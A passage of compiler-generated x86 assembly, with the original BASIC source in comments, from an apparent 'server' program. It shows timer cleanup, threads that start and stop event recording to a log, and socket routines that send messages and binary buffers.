;  *****  END FUNCTION  InitTimer ()  *****
;  *****
;
; [1537] FUNCTION DestroyTimer ()
.code
align 16
_DestroyTimer.server@0:
;  *****
;  *****  FUNCTION  DestroyTimer ()  *****
;  *****
func4F.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody4F.server:
;
; [1538] '	SHARED wTimerRes
;
; [1541] '    IF #pingtimer THEN
;
; [1542] '    	timeEndPeriod(wTimerRes)
;
; [1543] '    	timeKillEvent(#pingtimer)   ' Cancel the event
;
; [1544] '        #pingtimer = 0
;
; [1545] '    END IF
;
; [1547] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.DestroyTimer.server:  ;;; Function end label for Assembly Programmers.
end.func4F.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  DestroyTimer ()  *****
;  *****
;
; [1549] FUNCTION EventStartRecording ()
.code
align 16
_EventStartRecording.server@0:
;  *****
;  *****  FUNCTION  EventStartRecording ()  *****
;  *****
func52.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func52.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody52.server:
;
; [1550] SHARED heventr,hkeychk
data section 'globals$shared'
align	4
%heventr.server:	db 4 dup ?
.code
data section 'globals$shared'
align	4
%hkeychk.server:	db 4 dup ?
.code
;
; [1551] SHARED RECORDEVENTS
;
; [1552] SHARED of
;
; [1554] IFT RECORDEVENTS THEN RETURN $$FALSE
	mov	eax,d[%RECORDEVENTS.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0083.server			;;; i221
	mov	eax,0			;;; i659
	jmp	end.func52.server			;;; i258
else.0083.server:
end.if.0083.server:
;
; [1555] RECORDEVENTS = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%RECORDEVENTS.server],eax			;;; i668
;
; [1557] IFZ of THEN of = OpenEventLog()
	mov	eax,d[%of.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.0084.server			;;; i195
	call	func58.server			;;; i619
	mov	d[%of.server],eax			;;; i668
else.0084.server:
end.if.0084.server:
;
; [1558] id$ = "SLV"+STRING$(GetTickCount())
#ifdef EventStartRecording.id$
#undef EventStartRecording.id$
#endif
#define EventStartRecording.id$ ebp-40	; exposes local variable 'id$'
;
	sub	esp,64			;;; i487
	call	_GetTickCount@0			;;; i619
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.035A.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1559] #mtSaveLogEx = CreateMutexA (0,0,&id$)
;
; [0] EXTERNAL FUNCTION CreateMutexA (lpMutexAttributes, bInitialOwner, lpName)
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	0			;;; i656a
	call	_CreateMutexA@12			;;; i619
	mov	d[%#mtSaveLogEx.server],eax			;;; i668
;
; [1561] hkeychk = _beginthreadex (NULL, 0, &EventCheck(),0, 0, 0): Sleep (20)
#ifdef EventStartRecording.NULL
#undef EventStartRecording.NULL
#endif
#define EventStartRecording.NULL ebp-44	; exposes local variable 'NULL'
;
	mov	eax,addr _EventCheck.server@0			;;; i599
; .xstk52.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	push	0			;;; i656a
	push	[ebp-44]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
	mov	d[%hkeychk.server],eax			;;; i668
	push	20			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1562] heventr = _beginthreadex (NULL, 0, &EventSaveLogExA(),0, 0, 0): Sleep (20)
	mov	eax,addr _EventSaveLogExA.server@0			;;; i599
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	push	0			;;; i656a
	push	[ebp-44]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
	mov	d[%heventr.server],eax			;;; i668
	push	20			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1564] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func52.server			;;; i258
;
; [1565] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EventStartRecording.server:  ;;; Function end label for Assembly Programmers.
end.func52.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func52.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func52.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  EventStartRecording ()  *****
;  *****
;
; [1567] FUNCTION EventStopRecording ()
.code
align 16
_EventStopRecording.server@0:
;  *****
;  *****  FUNCTION  EventStopRecording ()  *****
;  *****
func53.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody53.server:
;
; [1568] SHARED heventr,hkeychk
;
; [1569] SHARED RECORDEVENTS
;
; [1572] IFF RECORDEVENTS THEN RETURN $$FALSE
	mov	eax,d[%RECORDEVENTS.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.0085.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func53.server			;;; i258
else.0085.server:
end.if.0085.server:
;
; [1573] RECORDEVENTS = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%RECORDEVENTS.server],eax			;;; i668
;
; [1574] Sleep (50)
	push	50			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1576] IF hkeychk THEN CloseHandle (hkeychk)
	mov	eax,d[%hkeychk.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0086.server			;;; i221
	push	[%hkeychk.server]			;;; i672a
	call	_CloseHandle@4			;;; i619
else.0086.server:
end.if.0086.server:
;
; [1577] IF heventr THEN CloseHandle (heventr)
	mov	eax,d[%heventr.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0087.server			;;; i221
	push	[%heventr.server]			;;; i672a
	call	_CloseHandle@4			;;; i619
else.0087.server:
end.if.0087.server:
;
; [1578] IF #mtSaveLogEx THEN CloseHandle (#mtSaveLogEx)
	mov	eax,d[%#mtSaveLogEx.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0088.server			;;; i221
	push	[%#mtSaveLogEx.server]			;;; i672a
	call	_CloseHandle@4			;;; i619
else.0088.server:
end.if.0088.server:
;
; [1579] #mtSaveLogEx = 0
	mov	eax,0			;;; i659
	mov	d[%#mtSaveLogEx.server],eax			;;; i668
;
; [1580] heventr = 0
	mov	eax,0			;;; i659
	mov	d[%heventr.server],eax			;;; i668
;
; [1581] hkeychk = 0
	mov	eax,0			;;; i659
	mov	d[%hkeychk.server],eax			;;; i668
;
; [1583] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func53.server			;;; i258
;
; [1584] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EventStopRecording.server:  ;;; Function end label for Assembly Programmers.
end.func53.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  EventStopRecording ()  *****
;  *****
;
; [1586] FUNCTION SendMsg (socket,STRING buffer)
.code
;
#ifdef SendMsg.socket
#undef SendMsg.socket
#endif
#define SendMsg.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef SendMsg.buffer
#undef SendMsg.buffer
#endif
#define SendMsg.buffer ebp+12	; exposes function argument 'buffer'
;
align 16
_SendMsg.server@8:
;  *****
;  *****  FUNCTION  SendMsg ()  *****
;  *****
func24.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody24.server:
;
; [1588] IFZ socket THEN RETURN $$FALSE
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0089.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func24.server			;;; i258
else.0089.server:
end.if.0089.server:
;
; [1589] buffer = buffer + "\r\n"
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.030A.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1590] RETURN SendBin (socket,&buffer,LEN(buffer))
	mov	eax,d[ebp+12]			;;; i642
; .xstk24.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.198			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.198:
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func22.server			;;; i619
	jmp	end.func24.server			;;; i258
;
; [1592] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SendMsg.server:  ;;; Function end label for Assembly Programmers.
end.func24.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SendMsg ()  *****
;  *****
;
; [1594] FUNCTION SendBin (socket,pbuffer,size)
.code
;
#ifdef SendBin.socket
#undef SendBin.socket
#endif
#define SendBin.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef SendBin.pbuffer
#undef SendBin.pbuffer
#endif
#define SendBin.pbuffer ebp+12	; exposes function argument 'pbuffer'
;
;
#ifdef SendBin.size
#undef SendBin.size
#endif
#define SendBin.size ebp+16	; exposes function argument 'size'
;
align 16
_SendBin.server@12:
;  *****
;  *****  FUNCTION  SendBin ()  *****
;  *****
func22.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.210:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.210			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,172			;;; i114a
;
funcBody22.server:
;
; [1595] SHARED tBytesSent
data section 'globals$shared'
align	4
%tBytesSent.server:	db 4 dup ?
.code
;
; [1596] SHARED APPLSTATUS
;
; [1597] SHARED CONNECTED
;
; [1600] IF !socket || !pbuffer || !size THEN RETURN $$FALSE
	mov	eax,d[ebp+8]			;;; i665
	neg	eax			;;; i888
	cmc				;;; i889
	rcr	eax,1			;;; i890
	sar	eax,31			;;; i891
	mov	ebx,d[ebp+12]			;;; i665
	neg	ebx			;;; i888
	cmc				;;; i889
	rcr	ebx,1			;;; i890
	sar	ebx,31			;;; i891
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	mov	ebx,d[ebp+16]			;;; i665
	neg	ebx			;;; i888
	cmc				;;; i889
	rcr	ebx,1			;;; i890
	sar	ebx,31			;;; i891
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.008A.server			;;; i221
	mov	eax,0			;;; i659
	jmp	end.func22.server			;;; i258
else.008A.server:
end.if.008A.server:
;
; [1601] IF ((APPLSTATUS == $$FALSE) || (CONNECTED == $$FALSE)) THEN
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	cmp	eax,0			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.202			;;; i467
	not	eax			;;; i468
A.202:
;+peep
	mov	ebx,d[%CONNECTED.server]			;;; i663a
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.203			;;; i467
	not	ebx			;;; i468
A.203:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.008B.server			;;; i221
;
; [1602] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func22.server			;;; i258
;
; [1603] END IF
else.008B.server:
end.if.008B.server:
;
; [1605] IF WaitForSingleObject (#hSSMsg,29000) == $$WAIT_TIMEOUT THEN
	push	29000			;;; i656a
	push	[%#hSSMsg.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.008C.server			;;; i219
;
; [1606] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func22.server			;;; i258
;
; [1607] END IF
else.008C.server:
end.if.008C.server:
;
; [1609] IF ((APPLSTATUS == $$FALSE) || (CONNECTED == $$FALSE)) THEN
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	cmp	eax,0			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.204			;;; i467
	not	eax			;;; i468
A.204:
;+peep
	mov	ebx,d[%CONNECTED.server]			;;; i663a
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.205			;;; i467
	not	ebx			;;; i468
A.205:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.008D.server			;;; i221
;
; [1610] ReleaseSemaphore (#hSSMsg,1,NULL)
#ifdef SendBin.NULL
#undef SendBin.NULL
#endif
#define SendBin.NULL ebp-40	; exposes local variable 'NULL'
;
	push	[ebp-40]			;;; i674a
	push	1			;;; i656a
	push	[%#hSSMsg.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [1611] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func22.server			;;; i258
;
; [1612] END IF
else.008D.server:
end.if.008D.server:
;
; [1614] ret = $$TRUE
#ifdef SendBin.ret
#undef SendBin.ret
#endif
#define SendBin.ret ebp-44	; exposes local variable 'ret'
;
	mov	eax,-1			;;; i659
	mov	d[ebp-44],eax			;;; i670
;
; [1615] total = 0
#ifdef SendBin.total
#undef SendBin.total
#endif
#define SendBin.total ebp-48	; exposes local variable 'total'
;
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1616] sent = 0
#ifdef SendBin.sent
#undef SendBin.sent
#endif
#define SendBin.sent ebp-52	; exposes local variable 'sent'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [1617] tsize = size
#ifdef SendBin.tsize
#undef SendBin.tsize
#endif
#define SendBin.tsize ebp-56	; exposes local variable 'tsize'
;
	mov	eax,d[ebp+16]			;;; i665
	mov	d[ebp-56],eax			;;; i670
;
; [1618] buffer = pbuffer
#ifdef SendBin.buffer
#undef SendBin.buffer
#endif
#define SendBin.buffer ebp-60	; exposes local variable 'buffer'
;
	mov	eax,d[ebp+12]			;;; i665
	mov	d[ebp-60],eax			;;; i670
;
; [1619] DO
align 8
do.008E.server:
;
; [1620] sent = send (socket, buffer+total, size, 0)
;
; [0] EXTERNAL SFUNCTION  send             (socket, addrMessage, length, flags)
	mov	eax,d[ebp-60]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	add	eax,ebx			;;; i775
; .xstk22.0000 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	push	0			;;; i656a
	push	[ebp+16]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_send@16			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [1621] IF (sent == $$SOCKET_ERROR) || (sent == 0) THEN
	mov	eax,d[ebp-52]			;;; i665
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.206			;;; i467
	not	eax			;;; i468
A.206:
;+peep
	mov	ebx,d[ebp-52]			;;; i665
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.207			;;; i467
	not	ebx			;;; i468
A.207:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.008F.server			;;; i221
;
; [1622] ret = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
;
; [1623] EXIT DO
	jmp	end.do.008E.server			;;; i144
;
; [1624] ELSE
	jmp	end.if.008F.server			;;; i107
else.008F.server:
;
; [1625] tBytesSent = tBytesSent + sent
	mov	eax,d[%tBytesSent.server]			;;; i663a
	mov	ebx,d[ebp-52]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[%tBytesSent.server],eax			;;; i668
;
; [1626] total = total + sent
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[ebp-48],eax			;;; i670
;
; [1627] size = size - sent
	mov	eax,d[ebp+16]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[ebp+16],eax			;;; i670
;
; [1628] END IF
end.if.008F.server:
;
; [1629] LOOP WHILE (total < tsize)
do.loop.008E.server:
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jl	< do.008E.server			;;; i193
end.do.008E.server:
;
; [1631] ReleaseSemaphore (#hSSMsg,1,NULL)
	push	[ebp-40]			;;; i674a
	push	1			;;; i656a
	push	[%#hSSMsg.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [1632] RETURN ret
	mov	eax,d[ebp-44]			;;; i665
	jmp	end.func22.server			;;; i258
;
; [1633] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SendBin.server:  ;;; Function end label for Assembly Programmers.
end.func22.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SendBin ()  *****
;  *****
;
; [1635] FUNCTION SendMail (socket,STRING buffer)
.code
;
#ifdef SendMail.socket
#undef SendMail.socket
#endif
#define SendMail.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef SendMail.buffer
#undef SendMail.buffer
#endif
#define SendMail.buffer ebp+12	; exposes function argument 'buffer'
;
align 16
_SendMail.server@8:
;  *****
;  *****  FUNCTION  SendMail ()  *****
;  *****
func23.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.216:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.216			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,172			;;; i114a
;
funcBody23.server:
;
; [1636] SHARED APPLSTATUS
;
; [1639] IF (APPLSTATUS != $$TRUE) THEN RETURN $$FALSE
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	cmp	eax,-1			;;; i684a
	je	>> else.0090.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func23.server			;;; i258
else.0090.server:
end.if.0090.server:
;
; [1641] buffer = buffer + "\r\n"
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.030A.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1642] size = SIZE(buffer)
#ifdef SendMail.size
#undef SendMail.size
#endif
#define SendMail.size ebp-40	; exposes local variable 'size'
;
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.211			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.211:
	mov	d[ebp-40],eax			;;; i670
;
; [1643] pbuffer = &buffer
#ifdef SendMail.pbuffer
#undef SendMail.pbuffer
#endif
#define SendMail.pbuffer ebp-44	; exposes local variable 'pbuffer'
;
	mov	eax,d[ebp+12]			;;; i642
	mov	d[ebp-44],eax			;;; i670
;
; [1644] ret = $$TRUE
#ifdef SendMail.ret
#undef SendMail.ret
#endif
#define SendMail.ret ebp-48	; exposes local variable 'ret'
;
	mov	eax,-1			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1645] total = 0
#ifdef SendMail.total
#undef SendMail.total
#endif
#define SendMail.total ebp-52	; exposes local variable 'total'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [1646] sent = 0
#ifdef SendMail.sent
#undef SendMail.sent
#endif
#define SendMail.sent ebp-56	; exposes local variable 'sent'
;
	mov	eax,0			;;; i659
	mov	d[ebp-56],eax			;;; i670
;
; [1647] tsize = size
#ifdef SendMail.tsize
#undef SendMail.tsize
#endif
#define SendMail.tsize ebp-60	; exposes local variable 'tsize'
;
	mov	eax,d[ebp-40]			;;; i665
	mov	d[ebp-60],eax			;;; i670
;
; [1649] DO
align 8
do.0091.server:
;
; [1650] sent = send (socket, pbuffer+total, size, 0)
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	add	eax,ebx			;;; i775
; .xstk23.0000 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-40]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_send@16			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [1651] IF (sent == $$SOCKET_ERROR) || (sent == 0) THEN
	mov	eax,d[ebp-56]			;;; i665
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.212			;;; i467
	not	eax			;;; i468
A.212:
;+peep
	mov	ebx,d[ebp-56]			;;; i665
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.213			;;; i467
	not	ebx			;;; i468
A.213:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.0092.server			;;; i221
;
; [1652] ret = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1653] EXIT DO
	jmp	end.do.0091.server			;;; i144
;
; [1654] ELSE
	jmp	end.if.0092.server			;;; i107
else.0092.server:
;
; [1655] total = total + sent
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[ebp-52],eax			;;; i670
;
; [1656] size = size - sent
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[ebp-40],eax			;;; i670
;
; [1657] END IF
end.if.0092.server:
;
; [1658] LOOP WHILE (total < tsize)
do.loop.0091.server:
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-60]			;;; i665
	cmp	eax,ebx			;;; i684a
	jl	< do.0091.server			;;; i193
end.do.0091.server:
;
; [1660] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func23.server			;;; i258
;
; [1661] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SendMail.server:  ;;; Function end label for Assembly Programmers.
end.func23.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SendMail ()  *****
;  *****
;
; [1663] FUNCTION STRING trim (str$,char)
.code
;
#ifdef trim.str$
#undef trim.str$
#endif
#define trim.str$ ebp+8	; exposes function argument 'str$'
;
;
#ifdef trim.char
#undef trim.char
#endif
#define trim.char ebp+12	; exposes function argument 'char'
;
align 16
_trim.server@8:
;  *****
;  *****  FUNCTION  trim ()  *****
;  *****
func12.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func12.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody12.server:
;
; [1666] IFZ str$ THEN RETURN ""
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.217			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0093.server			;;; i192
A.217:
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func12.server			;;; i258
else.0093.server:
end.if.0093.server:
;
; [1667] out$=""
#ifdef trim.out$
#undef trim.out$
#endif
#define trim.out$ ebp-40	; exposes local variable 'out$'
;
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1669] FOR p = 0 TO LEN (str$)-1
#ifdef trim.p
#undef trim.p
#endif
#define trim.p ebp-44	; exposes local variable 'p'
;
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.218			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.218:
	sub	eax,1			;;; i791
